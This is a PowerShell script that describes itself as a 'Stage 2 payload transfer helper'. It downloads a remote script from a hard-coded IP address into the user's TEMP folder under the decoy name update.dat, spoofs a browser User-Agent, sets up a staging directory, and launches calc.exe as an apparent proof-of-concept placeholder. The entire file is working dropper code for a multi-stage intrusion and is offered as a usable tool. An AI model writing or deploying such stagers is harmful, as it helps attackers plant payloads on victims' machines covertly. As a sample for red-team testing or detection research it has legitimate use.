
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://203.0.113.104:80/stage2.ps1',
    [string]$OutputPath = "$env:TEMP\update.dat",
    [int]$StageTimeout = 214,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Get-Stage2Payload -SourceUrl $TransferUrl -DestinationPath $OutputPath -TimeoutSec $StageTimeout -UserAgent $RequestAgent
if ($FetchResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}

$ProgressPreference = "SilentlyContinue"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
